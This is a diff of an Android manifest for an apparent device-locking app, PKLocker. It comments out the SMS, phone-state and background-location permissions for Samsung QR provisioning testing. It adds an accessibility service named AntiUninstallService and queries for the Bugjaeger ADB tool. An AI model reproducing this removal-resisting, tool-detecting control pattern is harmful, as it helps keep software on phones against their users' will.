@@ -10,17 +10,25 @@
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
-    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <!-- COMMENTED OUT: Sensitive permissions that block QR provisioning on Samsung -->
+    <!-- <uses-permission android:name="android.permission.READ_PHONE_STATE" /> -->
     
-    <uses-permission android:name="android.permission.RECEIVE_SMS" />
-    <uses-permission android:name="android.permission.READ_SMS" />
-    <uses-permission android:name="android.permission.SEND_SMS" />
-    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    <!-- <uses-permission android:name="android.permission.RECEIVE_SMS" /> -->
+    <!-- <uses-permission android:name="android.permission.READ_SMS" /> -->
+    <!-- <uses-permission android:name="android.permission.SEND_SMS" /> -->
+    <!-- <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" /> -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
 
-    <uses-feature android:name="android.hardware.usb.host" />
-    <uses-permission android:name="android.permission.USB_PERMISSION" />
+    <queries>
+        <package android:name="eu.sisik.bugjaeger" />
+        <package android:name="eu.sisik.bugjaeger.premium" />
+    </queries>
+
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission" />
+
+    <!-- <uses-feature android:name="android.hardware.usb.host" /> -->
+    <!-- <uses-permission android:name="android.permission.USB_PERMISSION" /> -->
 
     <application
         android:allowBackup="false"
@@ -88,6 +96,19 @@
             </intent-filter>
         </receiver>
 
+        <service
+            android:name=".service.AntiUninstallService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true"
+            android:label="PKLocker Accessibility Guard">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
         <receiver
             android:name=".receiver.BootReceiver"
             android:enabled="true"
@@ -106,6 +127,8 @@
             </intent-filter>
         </receiver>
 
+        <!-- COMMENTED OUT: SmsReceiver disabled while SMS permissions are removed for provisioning testing -->
+        <!--
         <receiver
             android:name=".receiver.SmsReceiver"
             android:enabled="true"
@@ -115,6 +138,7 @@
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
+        -->
 
         <provider
             android:name="androidx.core.content.FileProvider"
